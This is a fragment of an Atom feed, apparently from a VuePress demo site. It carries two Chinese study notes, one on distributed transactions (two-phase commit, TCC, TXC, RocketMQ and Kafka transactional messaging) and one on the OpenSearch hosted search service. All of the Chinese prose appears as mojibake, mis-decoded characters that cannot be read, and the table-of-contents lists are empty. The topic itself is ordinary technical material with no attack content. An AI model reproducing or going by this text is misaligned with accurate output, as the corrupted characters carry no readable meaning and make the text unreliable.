    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>

<p>åˆ†å¸ƒå¼äº‹åŠ¡æ˜¯æŒ‡äº‹åŠ¡çš„å‚ä¸è€…ã€æ”¯æŒäº‹åŠ¡çš„æœåŠ¡å™¨ã€èµ„æºæœåŠ¡å™¨ä»¥åŠäº‹åŠ¡ç®¡ç†å™¨åˆ†åˆ«ä½äºä¸åŒçš„ åˆ†å¸ƒå¼ç³»ç»Ÿ çš„ä¸åŒèŠ‚ç‚¹ä¹‹ä¸Šã€‚</p>
<h1 id="åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆ" tabindex="-1"> åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆ</h1>
<h2 id="ä¸¤é˜¶æ®µæäº¤" tabindex="-1"> ä¸¤é˜¶æ®µæäº¤</h2>
<p>ä¸¤é˜¶æ®µæäº¤ï¼Œæ˜¯å®ç°åˆ†å¸ƒå¼äº‹åŠ¡çš„æˆç†Ÿæ–¹æ¡ˆã€‚ç¬¬ä¸€é˜¶æ®µæ˜¯è¡¨å†³é˜¶æ®µï¼Œæ˜¯æ‰€æœ‰å‚ä¸è€…éƒ½å°†æœ¬äº‹åŠ¡èƒ½å¦æˆåŠŸçš„åé¦ˆå‘ç»™åè°ƒè€…ï¼›ç¬¬äºŒé˜¶æ®µæ˜¯æ‰§è¡Œé˜¶æ®µï¼Œåè°ƒè€…æ ¹æ®æ‰€æœ‰å‚ä¸è€…çš„åé¦ˆï¼Œé€šçŸ¥æ‰€æœ‰å‚ä¸è€…ï¼Œæ­¥è°ƒä¸€è‡´åœ°åœ¨æ‰€æœ‰åˆ†æ”¯ä¸Šæäº¤ï¼Œæˆ–è€…åœ¨æ‰€æœ‰åˆ†æ”¯ä¸Šå›æ»šã€‚</p>
<p>ç¼ºç‚¹</p>
<ol>
<li>åŒæ­¥é˜»å¡ï¼šæ‰€æœ‰äº‹åŠ¡å‚ä¸è€…åœ¨ç­‰å¾…å…¶å®ƒå‚ä¸è€…å“åº”çš„æ—¶å€™éƒ½å¤„äºåŒæ­¥é˜»å¡çŠ¶æ€ï¼Œæ— æ³•è¿›è¡Œå…¶å®ƒæ“ä½œã€‚</li>
<li>å•ç‚¹é—®é¢˜ï¼šåè°ƒè€…åœ¨ 2PC ä¸­èµ·åˆ°éå¸¸å¤§çš„ä½œç”¨ï¼Œå‘ç”Ÿæ•…éšœå°†ä¼šé€ æˆå¾ˆå¤§å½±å“ã€‚ç‰¹åˆ«æ˜¯åœ¨é˜¶æ®µäºŒå‘ç”Ÿæ•…éšœï¼Œæ‰€æœ‰å‚ä¸è€…ä¼šä¸€ç›´ç­‰å¾…ï¼Œæ— æ³•å®Œæˆå…¶å®ƒæ“ä½œã€‚</li>
<li>æ•°æ®ä¸ä¸€è‡´ï¼šåœ¨é˜¶æ®µäºŒï¼Œå¦‚æœåè°ƒè€…åªå‘é€äº†éƒ¨åˆ† Commit æ¶ˆæ¯ï¼Œæ­¤æ—¶ç½‘ç»œå‘ç”Ÿå¼‚å¸¸ï¼Œé‚£ä¹ˆåªæœ‰éƒ¨åˆ†å‚ä¸è€…æ¥æ”¶åˆ° Commit æ¶ˆæ¯ï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰éƒ¨åˆ†å‚ä¸è€…æäº¤äº†äº‹åŠ¡ï¼Œä½¿å¾—ç³»ç»Ÿæ•°æ®ä¸ä¸€è‡´ã€‚</li>
<li>å¤ªè¿‡ä¿å®ˆï¼šä»»æ„ä¸€ä¸ªèŠ‚ç‚¹å¤±è´¥å°±ä¼šå¯¼è‡´æ•´ä¸ªäº‹åŠ¡å¤±è´¥ï¼Œæ²¡æœ‰å®Œå–„çš„å®¹é”™æœºåˆ¶ã€‚</li>
</ol>
<h2 id="tcc" tabindex="-1"> TCC</h2>
<p>TCCï¼ˆTryã€Confirmã€Cancelï¼‰æ˜¯ä¸¤é˜¶æ®µæäº¤çš„ä¸€ä¸ªå˜ç§ã€‚TCCæä¾›äº†ä¸€ä¸ªæ¡†æ¶ï¼Œéœ€è¦åº”ç”¨ç¨‹åºæŒ‰ç…§è¯¥æ¡†æ¶ç¼–ç¨‹ï¼Œå°†ä¸šåŠ¡é€»è¾‘çš„æ¯ä¸ªåˆ†æ”¯éƒ½åˆ†ä¸ºTryã€Confirmã€Cancelä¸‰ä¸ªæ“ä½œé›†ã€‚TCCè®©åº”ç”¨ç¨‹åºè‡ªå·±å®šä¹‰æ•°æ®åº“æ“ä½œçš„ç²’åº¦ï¼Œä½¿å¾—é™ä½é”å†²çªã€æé«˜ååé‡æˆä¸ºå¯èƒ½ã€‚</p>
<h1 id="txc" tabindex="-1"> TXC</h1>
<h2 id="åº”ç”¨åœºæ™¯" tabindex="-1"> åº”ç”¨åœºæ™¯</h2>
<p>TXCçš„ç›®æ ‡åº”ç”¨åœºæ™¯æ˜¯ï¼šè§£å†³åœ¨åˆ†å¸ƒå¼åº”ç”¨ä¸­ï¼Œå¤šæ¡æ•°æ®åº“è®°å½•è¢«ä¿®æ”¹è€Œå¯èƒ½å¸¦æ¥çš„ä¸€è‡´æ€§é—®é¢˜ï¼›è¯¥åˆ†å¸ƒå¼åº”ç”¨å¯ä»¥æ¥å—æœ€ç»ˆä¸€è‡´æ€§ï¼›è¯¥åº”ç”¨çš„äº‹åŠ¡æ”¹é€ å¯¹å·¥ä½œé‡æœ‰è¾ƒä¸¥æ ¼çš„é™åˆ¶</p>
<ul>
<li>è·¨å¤šåˆ†åº“çš„åˆ†å¸ƒå¼æ•°æ®åº“äº‹åŠ¡åœºæ™¯</li>
<li>è·¨å¤šæ•°æ®åº“çš„äº‹åŠ¡åœºæ™¯</li>
<li>è·¨æ•°æ®åº“ç³»ç»Ÿã€æ¶ˆæ¯ç³»ç»Ÿçš„äº‹åŠ¡åœºæ™¯</li>
<li>è·¨æœåŠ¡çš„äº‹åŠ¡åœºæ™¯</li>
</ul>
<h2 id="æ¶æ„" tabindex="-1"> æ¶æ„</h2>
<ul>
<li>å®¢æˆ·ç«¯ï¼ˆTXC-Clientï¼‰ï¼Œèµ„æºç®¡ç†å™¨ï¼ˆRMï¼‰ï¼Œäº‹åŠ¡åè°ƒå™¨ï¼ˆTXC-Serverï¼‰ã€‚
å®¢æˆ·ç«¯ä¸äº‹åŠ¡åè°ƒå™¨é—´ï¼Œèµ„æºç®¡ç†å™¨ä¸äº‹åŠ¡åè°ƒå™¨é—´éƒ½æ˜¯é€šè¿‡TXCåˆ†å¸ƒå¼äº‹åŠ¡åè®®è¿›è¡Œé€šä¿¡ã€‚å®¢æˆ·ç«¯è´Ÿè´£ç•Œå®šäº‹åŠ¡è¾¹ç•Œï¼Œå¼€å¯/æäº¤/å›æ»šå…¨å±€äº‹åŠ¡ï¼Œ</li>
<li>èµ„æºç®¡ç†å™¨è´Ÿè´£ç®¡ç†èµ„æºï¼Œæ”¯æŒçš„èµ„æºåŒ…æ‹¬ï¼šTDDL/DRDSï¼ŒOracleï¼ŒMySQLï¼ŒRDSï¼ŒPgSQLï¼ŒH2ï¼ŒMQï¼ŒMetaQï¼ŒNotifyï¼Œåç»­è®¡åˆ’æ ¹æ®å®é™…ä¸šåŠ¡éœ€æ±‚æ”¯æŒæ›´å¤šç±»å‹èµ„æºã€‚</li>
<li>äº‹åŠ¡åè°ƒå™¨ï¼Œä¹Ÿå°±æ˜¯TXCæœåŠ¡å™¨ï¼Œè´Ÿè´£åè°ƒæ•´ä¸ªäº‹åŠ¡è¿‡ç¨‹ï¼Œæ˜¯åˆ†å¸ƒå¼äº‹åŠ¡å¤„ç†çš„å¤§è„‘ã€‚</li>
</ul>
<p>TXCäº‹åŠ¡å¯ä»¥é€šè¿‡RPCæ¡†æ¶å’Œæ¶ˆæ¯ä¸­é—´ä»¶è¿›è¡Œäº‹åŠ¡ä¼ é€’ï¼ŒæŠŠæ•´ä¸ªä¸šåŠ¡è°ƒç”¨é“¾è·¯æˆ–è€…æ¶ˆæ¯é“¾è·¯ä¸²åœ¨ä¸€ä¸ªåˆ†å¸ƒå¼äº‹åŠ¡ï¼Œæå¤§ç®€åŒ–åº”ç”¨å¼€å‘ã€‚</p>
<h2 id="txcåˆ†é˜¶æ®µæäº¤äº‹åŠ¡" tabindex="-1"> TXCåˆ†é˜¶æ®µæäº¤äº‹åŠ¡</h2>
<p>TXCé€šè¿‡ä¸¤é˜¶æ®µæäº¤æ–¹å¼è¿›è¡Œåˆ†å¸ƒå¼äº‹åŠ¡æ¨è¿›ã€‚å®¢æˆ·ç«¯å‘äº‹åŠ¡åè°ƒå™¨æ³¨å†Œå…¨å±€äº‹åŠ¡ä½œä¸ºä¸€é˜¶æ®µçš„å¼€å¯çš„æ ‡è®°ï¼›åˆ†å¸ƒå¼äº‹åŠ¡å†…çš„æ¯ä¸€æ¬¡èµ„æºï¼ˆDBæˆ–æ¶ˆæ¯ï¼‰æ“ä½œï¼Œå‡é€šè¿‡èµ„æºç®¡ç†å™¨è¿›è¡Œï¼Œèµ„æºç®¡ç†å™¨å‘äº‹åŠ¡åè°ƒå™¨æ³¨å†Œä¸€ä¸ªäº‹åŠ¡åˆ†æ”¯ï¼›å®¢æˆ·ç«¯é€šçŸ¥äº‹åŠ¡åè°ƒå™¨è¿›è¡Œå…¨å±€æäº¤ï¼å…¨å±€å›æ»šä½œä¸ºä¸€é˜¶æ®µå®Œæˆçš„æ ‡è®°ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-14-34-21.png" alt="" loading="lazy"></p>
<p>TXCåˆ†å¸ƒå¼äº‹åŠ¡çš„äºŒé˜¶æ®µç”±äº‹åŠ¡åè°ƒå™¨é©±åŠ¨ï¼Œé©±åŠ¨æ‰€æœ‰äº‹åŠ¡åˆ†æ”¯æ‰§è¡Œæäº¤æˆ–å›æ»šæ“ä½œï¼Œä¸€æ—¦ç¡®å®šæŸä¸ªåˆ†å¸ƒå¼äº‹åŠ¡æäº¤æˆ–å›æ»šï¼Œåˆ™ä¸æ–­é‡è¯•æ‰€æœ‰äº‹åŠ¡åˆ†æ”¯ï¼Œç›´åˆ°å®Œæˆæ•´ä¸ªåˆ†å¸ƒå¼äº‹åŠ¡æäº¤æˆ–å›æ»šã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-14-34-29.png" alt="" loading="lazy"></p>
<h2 id="è½¯ä»¶ç»“æ„" tabindex="-1"> è½¯ä»¶ç»“æ„</h2>
<p>TXCä½¿ç”¨diamondå®ç°è½¯è´Ÿè½½å‡è¡¡ï¼Œæ”¯æŒè‡ªåŠ¨åŒ–çš„æ‰©å®¹å’Œç¼©å®¹ï¼Œåœ¨ä¸šåŠ¡è§„æ¨¡å‘ç”Ÿå˜åŒ–æ—¶ä¸å¯¹ä¸šåŠ¡äº§ç”Ÿå½±å“ï¼Œå¹¶æ¶ˆé™¤äº†äº‹åŠ¡åè°ƒå™¨çš„å•ç‚¹æ•…éšœé£é™©ã€‚</p>
<p>ä¸šåŠ¡æ–¹å¯é€šè¿‡TXCå®¢æˆ·ç«¯APIæ¥å…¥TXCäº‹åŠ¡ï¼Œå½“è°ƒç”¨å·²ç»æ¥å…¥TXCäº‹åŠ¡çš„HSFæœåŠ¡æ—¶ï¼ŒHSFæœåŠ¡ä¼šè‡ªåŠ¨åŠ å…¥å½“å‰çš„å…¨å±€äº‹åŠ¡ï¼Œæœ€å¤§ç¨‹åº¦é™ä½ä¸šåŠ¡çš„å¼€å‘æˆæœ¬ã€‚</p>
<p>TXCåˆ†å¸ƒå¼äº‹åŠ¡ä¸­é—´ä»¶æä¾›å¤šç§èµ„æºå™¨æ”¯æŒï¼Œç›®å‰ï¼Œå·²ç»å®ŒæˆTDDLã€DRDSã€Notifyã€MetaQæ¥å…¥ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-14-40-38.png" alt="" loading="lazy"></p>
<h1 id="æ¶ˆæ¯é˜Ÿåˆ—å®ç°åˆ†å¸ƒå¼äº‹åŠ¡" tabindex="-1"> æ¶ˆæ¯é˜Ÿåˆ—å®ç°åˆ†å¸ƒå¼äº‹åŠ¡</h1>
<ul>
<li>é€šè¿‡ä¸¤é˜¶æ®µæäº¤æ¥å®ç°äº‹åŠ¡çš„ï¼Œäº‹åŠ¡æ¶ˆæ¯éƒ½ä¿å­˜åœ¨å•ç‹¬çš„ä¸»é¢˜ä¸Š</li>
<li>æ¶ˆæ¯é¢„å‘é€æœºåˆ¶ï¼šå¦‚æœä¸šåŠ¡æ‰§è¡ŒæˆåŠŸï¼Œå†å»å‘æ¶ˆæ¯ï¼Œæ­¤æ—¶å¦‚æœè¿˜æ²¡æ¥å¾—åŠå‘æ¶ˆæ¯ï¼Œä¸šåŠ¡ç³»ç»Ÿå°±å·²ç»å®•æœºäº†ï¼Œç³»ç»Ÿé‡å¯åï¼Œæ ¹æœ¬æ²¡æœ‰è®°å½•ä¹‹å‰æ˜¯å¦å‘é€è¿‡æ¶ˆæ¯ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´ä¸šåŠ¡æ‰§è¡ŒæˆåŠŸï¼Œæ¶ˆæ¯æœ€ç»ˆæ²¡å‘å‡ºå»çš„æƒ…å†µã€‚</li>
</ul>
<h2 id="rocketmqå®ç°" tabindex="-1"> RocketMQå®ç°</h2>
<p>é€šè¿‡â€œåŠæ¶ˆæ¯â€æ¥å®ç°çš„
<img src="@source/assets/cs-note/distribute/mk-2020-07-12-14-12-40.png" alt="" loading="lazy"></p>
<ul>
<li>producerå‘é€halfæ¶ˆæ¯</li>
<li>brokerç¡®è®¤halfæ¶ˆæ¯ï¼Œå¹¶é€šçŸ¥producerï¼Œè¡¨ç¤ºæ¶ˆæ¯å·²ç»æˆåŠŸå‘é€åˆ°brokerï¼ˆè¿™ä¸ªè¿‡ç¨‹å…¶å®å°±æ˜¯æ­¥éª¤1brokerçš„è¿”å›ï¼‰</li>
<li>produceræ”¶åˆ°halfç¡®è®¤æ¶ˆæ¯ä¹‹åï¼Œæ‰§è¡Œè‡ªå·±æœ¬åœ°äº‹åŠ¡ï¼Œå¹¶å°†äº‹åŠ¡ç»“æœï¼ˆUNKNOWã€commitã€rollbackï¼‰å‘Šè¯‰brokerï¼ˆè¿™æ˜¯ä¸€ä¸ªonewayæ¶ˆæ¯ï¼Œè€Œä¸”å¤±è´¥ä¸é‡è¯•ï¼‰</li>
<li>brokeræ”¶åˆ°produceræœ¬åœ°äº‹åŠ¡çš„ç»“æœåå†³å®šæ˜¯å¦æŠ•é€’æ¶ˆæ¯ç»™consumer</li>
<li>é‰´äºproducerå‘é€æœ¬åœ°äº‹åŠ¡ç»“æœå¯èƒ½å¤±è´¥ï¼Œbrokerä¼šå®šæ—¶æ‰«æé›†ç¾¤ä¸­çš„äº‹åŠ¡æ¶ˆæ¯ï¼Œç„¶åå›æŸ¥</li>
</ul>
<h2 id="kafka" tabindex="-1"> kafka</h2>
<p>ç›´æ¥å°†æ¶ˆæ¯å‘é€ç»™å¯¹åº”çš„topicï¼Œé€šè¿‡å®¢æˆ·ç«¯æ¥è¿‡æ»¤å®ç°çš„</p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">OpenSearch</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%90%9C%E7%B4%A2.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%90%9C%E7%B4%A2.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
</ul>

<h1 id="opensearch" tabindex="-1"> OpenSearch</h1>
<h2 id="ç®€ä»‹" tabindex="-1"> ç®€ä»‹</h2>
<p>å¼€æ”¾æœç´¢ï¼ˆOpenSearchï¼‰æ˜¯ä¸€æ¬¾ç»“æ„åŒ–æ•°æ®æœç´¢æ‰˜ç®¡æœåŠ¡ï¼Œä¸ºç§»åŠ¨åº”ç”¨å¼€å‘è€…å’Œç½‘ç«™ç«™é•¿æä¾›ç®€å•ã€é«˜æ•ˆã€ç¨³å®šã€ä½æˆæœ¬å’Œå¯æ‰©å±•çš„æœç´¢è§£å†³æ–¹æ¡ˆã€‚</p>
<p>OpenSearchåŸºäºé˜¿é‡Œå·´å·´è‡ªä¸»ç ”å‘çš„å¤§è§„æ¨¡åˆ†å¸ƒå¼æœç´¢å¼•æ“å¹³å°ï¼Œè¯¥å¹³å°æ‰¿è½½äº†é˜¿é‡Œå·´å·´å…¨éƒ¨ä¸»è¦æœç´¢ä¸šåŠ¡ï¼ŒåŒ…æ‹¬æ·˜å®ã€å¤©çŒ«ã€ä¸€æ·˜ã€1688ã€ICBUã€ç¥é©¬æœç´¢ç­‰ä¸šåŠ¡ã€‚OpenSearchä»¥å¹³å°æœåŠ¡åŒ–çš„å½¢å¼ï¼Œå°†ä¸“ä¸šæœç´¢æŠ€æœ¯ç®€å•åŒ–ã€ä½é—¨æ§›åŒ–å’Œä½æˆæœ¬åŒ–ï¼Œè®©æœç´¢å¼•æ“æŠ€æœ¯ä¸å†æˆä¸ºå®¢æˆ·çš„ä¸šåŠ¡ç“¶é¢ˆï¼Œä»¥ä½æˆæœ¬å®ç°äº§å“æœç´¢åŠŸèƒ½å¹¶å¿«é€Ÿè¿­ä»£ã€‚</p>
<h2 id="äº§å“ç‰¹æ€§" tabindex="-1"> äº§å“ç‰¹æ€§</h2>
<ul>
<li>æ”¯æŒæ–‡æ¡£ç´¢å¼•ç»“æ„å®šåˆ¶ï¼Œä»¥åŠè‡ªç”±ä¿®æ”¹
OpenSearchå°†æœç´¢å¼•æ“å¤æ‚çš„ç´¢å¼•ç»“æ„æ¦‚å¿µç®€å•åŒ–ã€å¯è§†åŒ–å’Œè‡ªåŠ©å®šåˆ¶åŒ–ã€‚å¼€å‘è€…å¯ä»¥é€šè¿‡æ§åˆ¶å°åˆ›å»ºæœç´¢å®ä¾‹ï¼Œå®šåˆ¶æ–‡æ¡£å­—æ®µçš„ç»“æ„å’Œå±æ€§ï¼ŒåŒ…æ‹¬å­—æ®µåç§°ã€ç±»å‹ã€åˆ†è¯æ–¹å¼ã€æœç´¢å±æ€§ç­‰ã€‚æœç´¢å®ä¾‹åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å¯ä»¥è‡ªç”±ä¿®æ”¹ï¼Œæ»¡è¶³äº†äº§å“å¿«é€Ÿå˜åŒ–çš„éœ€æ±‚ï¼Œæå¤§ç¼©çŸ­äº†éœ€æ±‚å˜æ›´åˆ°ä¸Šçº¿çš„è¿‡ç¨‹ã€‚</li>
<li>æ”¯æŒå¤šç§æ•°æ®æ¥å…¥æ–¹å¼ï¼Œæ•°æ®è‡ªåŠ¨åŒæ­¥æ›´æ–°
å¼€å‘è€…çš„æ•°æ®å¦‚æœåœ¨é˜¿é‡Œäº‘çš„äº‘å­˜å‚¨æœåŠ¡ï¼ˆRDSã€OSSã€ODPSç­‰ï¼‰ä¸Šï¼Œå¼€å‘è€…æ˜¯éœ€è¦åœ¨OpenSearchæ§åˆ¶å°ä¸­æˆæƒï¼Œæ•°æ®çš†å¯ä»¥è‡ªåŠ¨åŒæ­¥è‡³OpenSearchä¸­ï¼Œåç»­æ•°æ®çš„æ›´æ–°ä¹Ÿå¯ä»¥è‡ªåŠ¨å®æ—¶åŒæ­¥ï¼ˆODPSé™¤å¤–ï¼‰ã€‚è€Œä¸”åœ¨åŒä¸€åŒºåŸŸä¸­ï¼Œä»äº‘å­˜å‚¨åŒæ­¥æ•°æ®è‡³OpenSearchå…æ”¶æµé‡è´¹ã€‚ä¹¦å±€ä¸åœ¨é˜¿é‡Œäº‘ä¸Šçš„å¼€å‘è€…ï¼Œå¯ä»¥é€šè¿‡RESTfulAPIæˆ–è€…SDKä¸Šä¼ æ•°æ®ï¼Œå°æ•°æ®é‡ä¹Ÿå¯ä»¥ç›´æ¥åœ¨æ§åˆ¶å°ä¸Šä¼ ã€‚</li>
<li>æ”¯æŒå¤šè¡¨ï¼Œæ’ä»¶å¼æ•°æ®å¤„ç†
ç±»ä¼¼äºæ•°æ®åº“ï¼Œæ¯ä¸ªæœç´¢å®ä¾‹å¯ä»¥åˆ›å»ºä¸€å¼ æˆ–å¤šå¼ è¡¨ï¼Œæ¯å¼ è¡¨çš„å­—æ®µä¸Šå¯ä»¥å†…ç½®æ•°æ®å¤„ç†æ’ä»¶ï¼Œå¯¹å­—æ®µå†…å®¹åšæ–‡æœ¬å¤„ç†å’Œè½¬æ¢ï¼Œä¾‹å¦‚æ‹¼éŸ³è½¬æ¢ã€HTMLæ ‡ç­¾å‰”é™¤ã€JSONæ•°æ®è§£é‡Šç­‰ï¼Œå¤šä¸ªè¡¨å¯ä»¥Joinåœ¨ä¸€èµ·å®ç°å¤šè¡¨è”åˆæŸ¥è¯¢ã€‚æ•°æ®å­˜æ”¾åœ¨RDSæ•°æ®åº“é‡Œçš„å¼€å‘è€…ï¼Œå¯ä»¥ç”¨æ­¤åŠŸèƒ½ä»£æ›¿æ•°æ®åº“å…¨æ–‡æ£€ç´¢ï¼Œå®ç°æ›´é«˜çš„æ€§èƒ½å’Œæœç´¢ä½“éªŒã€‚</li>
<li>æ”¯æŒæœç´¢ç»“æœç›¸å…³æ€§ä¸¤é˜¶æ®µæ’åºå®šåˆ¶ï¼Œçº¿ä¸Šå®æ—¶ç›¸å…³æ€§è°ƒè¯•
ç”¨æˆ·ä½¿ç”¨æœç´¢åŠŸèƒ½çš„ç›®çš„æ˜¯ä»æµ·é‡æ•°æ®ä¸­æ‰¾åˆ°è‡ªå·±æƒ³è¦å¾—ä¿¡æ¯ï¼Œæœç´¢ç»“æœç›¸å…³æ€§æ’åºæ˜¯å½±å“ç”¨æˆ·ä½“éªŒçš„æœ€å…³é”®çš„ä¸€ç¯ã€‚OpenSearchæ”¯æŒå¼€å‘è€…å®šåˆ¶ä¸¤è½®ç›¸å…³æ€§æ’åºè§„åˆ™æ¥å‡†ç¡®æ§åˆ¶æœç´¢ç»“æœçš„æ’åºã€‚
<ul>
<li>ç¬¬ä¸€è½®ä¸ºç²—æ’ï¼Œä»å‘½ä¸­çš„æ–‡æ¡£é›†åˆé‡Œé€‰å‡ºç›¸å…³æ–‡æ¡£ã€‚æ”¯æŒé…ç½®å­—æ®µã€æ–‡æœ¬ç›¸å…³æ€§å’Œæ—¶æ•ˆæ€§ç®—åˆ†ç‰¹å¾çš„æƒé‡ã€‚</li>
<li>ç¬¬äºŒè½®ä¸ºç²¾æ’ï¼Œå¯¹ç²—æ’çš„ç»“æœåšæ›´ç²¾ç»†ç­›é€‰ï¼Œæ”¯æŒä»»æ„å¤æ‚çš„è¡¨è¾¾å¼å’Œè¯­æ³•ã€‚è¿™æ ·åšé™¤äº†æ–¹ä¾¿å¼€å‘è€…èƒ½å‡†ç¡®æ§åˆ¶æ’åºæ•ˆæœä¹‹å¤–ï¼Œæ›´é‡è¦çš„æ˜¯èƒ½ä¼˜åŒ–ç³»ç»Ÿæ€§èƒ½ï¼Œæé«˜æœç´¢ç›¸åº”é€Ÿåº¦ã€‚å¼€å‘è€…å¯ä»¥é€šè¿‡æ’åºè§„åˆ™ç›´æ¥åœ¨æ§åˆ¶å°ä¸­è°ƒè¯•æ•ˆæœï¼Œå¹¶åœ¨æ•ˆæœæ»¡æ„åç›´æ¥åˆ‡æ¢åˆ°çº¿ä¸Š</li>
</ul>
</li>
</ul>
<h2 id="äº§å“æ¶æ„" tabindex="-1"> äº§å“æ¶æ„</h2>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-56-46.png" alt="" loading="lazy"></p>
<ul>
<li>ç™½è‰²çº¿ä¸ºå®æ—¶æ•°æ®å¤„ç†æµ</li>
<li>çº¢è‰²çº¿ä¸ºå…¨é‡æ•°æ®å¤„ç†æµ</li>
<li>é»‘è‰²çº¿ä¸ºæœç´¢æµç¨‹</li>
</ul>
<p>å¼€å‘è€…é€šè¿‡æ§åˆ¶å°å’ŒAPIä¸ç³»ç»Ÿäº¤äº’ã€‚å…¸å‹çš„ä½¿ç”¨æµç¨‹æ˜¯å¼€å‘è€…è¿›å…¥æ§åˆ¶å°ï¼Œåˆ›å»ºåº”ç”¨å®ä¾‹ï¼Œé…ç½®åº”ç”¨å­—æ®µç»“æ„ã€æœç´¢å±æ€§ï¼Œé…ç½®æ–‡æœ¬å¤„ç†æ’ä»¶ã€å®šåˆ¶ç›¸å…³æ€§æ’åºè§„åˆ™ç­‰ã€‚åº”ç”¨å®ä¾‹åˆ›å»ºå®Œæˆåï¼Œå¼€å‘è€…å†é€šè¿‡SDK/APIå°†æ•°æ®æ¨é€è‡³äº‘ç«¯ï¼ˆé˜¿é‡Œäº‘å­˜å‚¨ç”¨æˆ·å¯ä»¥é…ç½®æ•°æ®è‡ªåŠ¨åŒæ­¥ï¼Œåªéœ€åœ¨æ§åˆ¶å°ä¸­æˆæƒï¼‰ï¼Œæ•°æ®å®æ—¶æµå¼è¿›å…¥Importå­ç³»ç»Ÿçš„æ•°æ®å¯¼å…¥æœåŠ¡æ¨¡å—(iStream Service)ï¼Œç»è¿‡æ ¼å¼è§£æå’Œæ•°æ®å¤„ç†åï¼Œå­˜å‚¨åœ¨ç»“æ„åŒ–æ•°æ®å­˜å‚¨ç³»ç»Ÿä¸­ã€‚éšåï¼ŒDumpå­ç³»ç»Ÿçš„æ•°æ®å¯¼å‡ºæœåŠ¡(iStream Service)å°†æ•°æ®ç»è¿‡ä¸€å®šå¤„ç†åå‘é€ç»™å®æ—¶æ¶ˆæ¯é˜Ÿåˆ—ç³»ç»Ÿ(Swift)ï¼Œæœç´¢ç³»ç»Ÿ(HA3)ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è®¢é˜…æ•°æ®ï¼Œåœ¨å†…å­˜ä¸­æ„å»ºç´¢å¼•å¹¶æä¾›æœç´¢æœåŠ¡ã€‚è¿™ä¸ªæ•°æ®å®æ—¶æµå¼å¤„ç†è¿‡ç¨‹ï¼ˆç™½è‰²ç®­å¤´ï¼‰å¤§æ¦‚åç§’å·¦å³ã€‚</p>
<p>å½“å¼€å‘è€…ä¿®æ”¹äº†ç´¢å¼•ç»“æ„ï¼Œéœ€è¦å¯¹åº”ç”¨ä¸­çš„æ•°æ®åšå¢é‡ç´¢å¼•é‡å»ºã€‚ä¸ºäº†ä¿è¯æœç´¢æ•ˆç‡ï¼Œç³»ç»Ÿä¹Ÿä¼šå®šæœŸå¯¹æ‰€æœ‰æ•°æ®åšå…¨é‡é‡å»ºç´¢å¼•ã€‚ç´¢å¼•é‡å»ºæµç¨‹å‚è§çº¢è‰²ç®­å¤´ï¼Œè¿™æ˜¯ä¸€ä¸ªéå®æ—¶çš„æµç¨‹ï¼Œä¾æ•°æ®å¤§å°ä¸åŒå¯èƒ½éœ€è¦å‡ åˆ†é’Ÿåˆ°åå‡ åˆ†é’Ÿï¼Œå…¨é‡ç´¢å¼•é‡å»ºåˆ™éœ€è¦æ•°å°æ—¶ã€‚</p>
<p>æ•°æ®åœ¨äº‘ç«¯ç»è¿‡ä¸€ç³»åˆ—å¤„ç†å’Œç´¢å¼•æ„å»ºåï¼Œå¼€å‘è€…å°±å¯ä»¥é€šè¿‡APIæœç´¢åº”ç”¨å®ä¾‹ä¸­çš„æ•°æ®ã€‚æœç´¢è¯·æ±‚é¦–å…ˆå‘é€åˆ°æŸ¥è¯¢èšåˆæœåŠ¡Aggregatorã€‚</p>
